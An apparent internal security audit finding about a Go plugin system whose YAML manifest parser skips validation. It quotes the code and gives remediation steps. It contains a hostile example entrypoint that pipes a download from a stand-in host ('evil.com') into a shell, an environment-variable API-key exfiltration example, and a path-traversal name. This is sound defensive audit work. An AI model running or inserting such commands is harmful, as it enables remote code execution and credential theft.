# [High] Plugin manifest YAML deserialization trusts all keys without schema validation

**Scope:** Plugin system — trust boundary #5 (Plugin manifests)
**Topic:** Security
**Date:** 2026-04-11

## Problem

`ParseManifest` deserializes plugin.yaml files with `yaml.Unmarshal` into a `PluginManifest` struct but performs zero validation on the parsed result. Any field can be set to any value. The `Name` field flows into filesystem paths, host registrations, and store operations with no sanitization.

## Evidence

`internal/plugin/config.go:L134-L144`:

```go
func ParseManifest(path string) (*PluginManifest, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var m PluginManifest
	if err := yaml.Unmarshal(data, &m); err != nil {
		return nil, fmt.Errorf("parse %s: %w", path, err)
	}
	return &m, nil
}
```

No validation occurs after unmarshal. The `Name` field is used as:
- A filesystem path component: `filepath.Join(pluginsDir, manifest.Name)` in `handleInstallLocal` (`internal/api/plugins.go:L283`)
- A plugin host key: `host.SetPluginConfig(dp.Manifest.Name, cfg)` (`internal/plugin/loader.go:L110`)
- A constructor lookup key: `LookupConstructor(manifest.Name)` (`internal/plugin/loader.go:L72`)

The `Entrypoint` field for subprocess plugins is split by `strings.Fields` and the first token is passed to `exec.LookPath` then `exec.Command` (`internal/plugin/loader.go:L142-L152,L177-L183`):

```go
func parseEntrypoint(entrypoint, pluginDir string) (string, []string) {
	parts := strings.Fields(entrypoint)
	if len(parts) == 0 {
		return entrypoint, nil
	}
	return parts[0], parts[1:]
}
```

A malicious `plugin.yaml` with `entrypoint: "/bin/sh -c 'curl evil.com | sh'"` would execute arbitrary commands.

The `EnvVar` field in config entries (`internal/plugin/config.go:L80-L86`) causes the host to read arbitrary environment variables and pass their values to the plugin:

```go
type ConfigEntry struct {
	Type        string `yaml:"type"`
	Required    bool   `yaml:"required"`
	EnvVar      string `yaml:"env_var"`
	Default     string `yaml:"default"`
	Description string `yaml:"description"`
}
```

A plugin manifest with `env_var: ANTHROPIC_API_KEY` in its config section would exfiltrate the API key to the plugin process.

The `Dependencies` field is consumed without validation by `sortByDeps` — a plugin can declare a dependency on any plugin name, influencing load order.

The `Requires` field (`map[string]interface{}`) is parsed but never consumed by any production code — dead declaration surface.

## Impact

An attacker who can place or modify a `plugin.yaml` in the plugins directory can:
1. Execute arbitrary commands via the `entrypoint` field (subprocess plugins)
2. Exfiltrate environment variables (including API keys) via `env_var` config entries
3. Inject a malicious plugin name containing path separators (e.g., `../../etc/malicious`) to write outside the plugins directory during install-local flows
4. Influence plugin load ordering via fabricated dependency declarations

The primary install vectors are:
- `POST /api/plugins/install-local` (authenticated API, accepts arbitrary local path — already flagged as Critical in `api-privilege-boundary` audit)
- `POST /api/plugins/install` (git clone from configured repo)
- `POST /api/plugins/catalog/install` (download from catalog archive)
- Manual placement in the `plugins/` directory

The catalog install path has checksum + optional signature verification, which mitigates MITM but not a compromised catalog source. The git clone and local install paths have no verification.

## Recommendation

1. Add a `ValidateManifest(*PluginManifest) error` function that enforces:
   - `Name` matches `^[a-z0-9][a-z0-9-]*$` (no path separators, no dots, lowercase slug)
   - `Entrypoint` does not contain shell metacharacters; validate it is a single binary path + safe args
   - `EnvVar` values in config entries are validated against an allowlist (plugin-namespaced only, e.g., `NANITE_PLUGIN_<NAME>_*`) — never allow reading host API keys
   - `Runtime` is one of `"builtin"`, `"subprocess"`, or empty
   - `Dependencies` are valid plugin name slugs
2. Call `ValidateManifest` in `ParseManifest` before returning, and in `DiscoverPlugins` / `handleInstallLocal` / `handleCatalogInstall` before any filesystem or host operations.
3. For subprocess entrypoints: resolve the command to an absolute path within the plugin directory and reject anything outside it.

## References

- `internal/plugin/config.go:L134-L144` — ParseManifest
- `internal/plugin/loader.go:L32-L86` — DiscoverPlugins
- `internal/plugin/loader.go:L138-L172` — newSubprocessPluginFromManifest
- `internal/api/plugins.go:L257-L299` — handleInstallLocal
- Cross-ref: `api-privilege-boundary` finding 03 (plugin install path traversal) — that audit covered the API handler, this finding covers the manifest parser itself
